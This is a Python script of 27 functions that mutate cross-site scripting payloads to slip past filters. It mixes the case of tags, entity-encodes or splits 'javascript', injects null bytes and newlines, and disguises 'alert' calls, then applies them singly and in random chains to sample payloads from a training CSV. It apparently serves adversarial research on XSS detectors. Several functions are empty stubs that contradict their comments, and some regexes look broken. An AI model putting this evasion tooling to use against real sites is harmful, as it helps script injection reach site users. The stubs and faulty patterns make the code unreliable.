import random
import re
import pandas as pd
import importlib
import importlib.util


def inject_javascript(payload, injection):
    # inject outside what between & and ;
    parts = re.split(r'&(?<=&)[\D\d]*[(?=;);|(?=9)9]', payload)
    parts = [part for part in parts if part.strip()]
    # random position to inject
    pos = random.randint(0, len(parts) - 1)
    # inject at random position
    length = len(parts[pos])
    new_part = parts[pos][:length // 2] + injection + parts[pos][length // 2:]
    return re.sub(parts[pos], new_part, payload)


# Add " &#14" before "javascript"
def action_1(payload):
    return re.sub(r'java[\D\d]*script', ' &#14javascript', payload)


# Mixed case HTML attributes
def action_2(payload):
    def find_attribute(match):
        char = match.group(0)
        return re.sub(r'\w+(?==)', random_case, char)

    def random_case(match):
        string = ''
        char = match.group(0)
        for c in char:
            new_c = random.choice([c.upper(), c.lower()])
            string += new_c
        return string

    return re.sub(r'<.+>|</.+>', find_attribute, payload)


# Replace spaces with "/", "%0A", or "%0D"
def action_3(payload):
    return re.sub(r'\s', random.choice(['/', '%0A', '%0D']), payload)


# Mixed case HTML tags
def action_4(payload):
    def random_case(match):
        string = ''
        char = match.group(0)
        for c in char:
            new_c = random.choice([c.upper(), c.lower()])
            string += new_c
        return string

    return re.sub(r'<\w+>|</\w+>', random_case, payload)


# Remove closing symbols of the single tags
def action_5(payload):
    return payload
    pass


# Add "&NewLine;" to "javascript"
def action_6(payload):
    def inject(match):
        char = match.group(0)
        return inject_javascript(char, '&NewLine;')

    return re.sub(r'j[\D\d]*a[\D\d]*v[\D\d]*a[\D\d]*s[\D\d]*c[\D\d]*r[\D\d]*i[\D\d]*p[\D\d]*t', inject, payload)


# Add "&#x09" to "javascript"
def action_7(payload):
    def inject(match):
        char = match.group(0)
        return inject_javascript(char, '&#x09')

    return re.sub(r'j[\D\d]*a[\D\d]*v[\D\d]*a[\D\d]*s[\D\d]*c[\D\d]*r[\D\d]*i[\D\d]*p[\D\d]*t', inject, payload)


# HTML entity encoding for JS code (hexadecimal)
def action_8(payload):
    return payload
    pass


# Double write html tags
def action_9(payload):
    def duplicate_tag(match):
        char = match.group(0)
        return char + char

    return re.sub(r'<\w+>|</\w+>', duplicate_tag, payload)


# Replace "http://" with "//"
def action_10(payload):
    return re.sub(r'http://|https://', '//', payload)


# HTML entity encoding for JS code (decimal)
def action_11(payload):
    return payload
    pass


# Add "&colon;" to "javascript"
def action_12(payload):
    def inject(match):
        char = match.group(0)
        return inject_javascript(char, '&colon;')

    return re.sub(r'j[\D\d]*a[\D\d]*v[\D\d]*a[\D\d]*s[\D\d]*c[\D\d]*r[\D\d]*i[\D\d]*p[\D\d]*t', inject, payload)


# Add "&Tab" to "javascript"
def action_13(payload):
    def inject(match):
        char = match.group(0)
        return inject_javascript(char, '&Tab;')

    return re.sub(r'j[\D\d]*a[\D\d]*v[\D\d]*a[\D\d]*s[\D\d]*c[\D\d]*r[\D\d]*i[\D\d]*p[\D\d]*t', inject, payload)


#  Add string "/drfv/" after the script tag
def action_14(payload):
    return payload
    pass


# Replace "(" and ")" with grave note
def action_15(payload):
    return re.sub(r'[()]', '`', payload)


# Encode data protocol with Base64
def action_16(payload):
    return payload
    pass


# Remove quotation marks
def action_17(payload):
    return re.sub(r'["\']', '', payload)


# Unicode encoding for JS code
def action_18(payload):
    return payload
    pass


# HTML entity encoding for "javascript"
def action_19(payload):
    return re.sub(r'javascript', '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;', payload)


# Replace ">" of single label with "<"
def action_20(payload):
    return re.sub(r'<\w+>', lambda x: x.group(0).replace('>', '<'), payload)


# Replace "alert" with "top['al'+'ert'](1)"
def action_21(payload):
    return re.sub(r'alert', "top['al'+'ert'](1)", payload)


# Replace "alert" with "top[8680439.toString(30)](1)"
def action_22(payload):
    return re.sub(r'alert', "top[8680439.toString(30)](1)", payload)


# Add interference string before the example
def action_23(payload):
    return payload
    pass


# Add comment into tags
def action_24(payload):
    def add_comment(match):
        char = match.group(0)
        length = len(char)
        pos = random.randint(1, length - 1)
        return char[:pos] + "<!-- Comment -->" + char[pos:]

    return re.sub(r'<\w+>|</\w+>', add_comment, payload)


# "vbscript" replaces "javascript"
def action_25(payload):
    return re.sub(r'javascript', 'vbscript', payload)


#  Inject empty byte "%00" into tags
def action_26(payload):
    def inject_byte(match):
        char = match.group(0)
        length = len(char)
        pos = random.randint(1, length - 1)
        return char[:pos] + "%00" + char[pos:]

    return re.sub(r'<\w+>|</\w+>', inject_byte, payload)


# Replace alert with "top[/al/.source+/ert/.source/](1)"
def action_27(payload):
    return re.sub(r'alert', "top[/al/.source+/ert/.source/](1)", payload)


def main():
    data_set = pd.read_csv('../../data/train.csv')
    example = data_set.head()["Payloads"][0]
    ex_2 = data_set["Payloads"][216]
    ex_3 = data_set["Payloads"][8344]
    print(example)
    print(ex_2)
    print()
    for i in range(1, 28):
        action_name = "action_" + str(i)
        action = globals()[action_name]
        print(action_name)
        print(f"Action {i}", action(example))
        print(f"Action {i}", action(ex_2))
        print(f"Action {i}", action(ex_3))
        print(f"Action {i}", action('https://<script>alert("1")</script>'))
        print(f"Action {i}", action('https://<script src=ciao>alert("1")</script>'))
        print(f"Action {i}", action('javascript'))
        print(f"Action {i}", action('java&#x09;scr&NewLine;ipt'))
        print()

    # Generate array of random mutators of random length
    mutators = [globals()[f"action_{random.randint(2, 27)}"] for _ in range(random.randint(1, 5))]
    # Apply each mutation to the example
    ex = ex_2
    for mutator in mutators:
        ex = mutator(ex)
        print(ex)


if __name__ == '__main__':
    main()
